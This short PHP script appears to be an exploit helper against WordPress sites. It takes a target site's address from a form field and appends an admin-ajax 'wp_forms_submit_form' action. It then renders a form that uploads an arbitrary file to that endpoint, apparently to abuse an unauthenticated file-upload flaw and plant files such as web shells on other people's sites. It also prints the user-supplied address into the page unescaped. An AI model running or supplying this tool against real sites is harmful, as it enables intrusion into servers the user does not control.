<?php 
$a=$_POST['uri'];
$b="/wp-admin/admin-ajax.php?action=wp_forms_submit_form";
$c=$a.$b;
 ?>

<center>
	<?=$c.'<br>';?>
<form action='<?=$c;?>' method='POST'>
<input name='file' type='file'>
<input type='submit' name='upload'>
</form>
</center>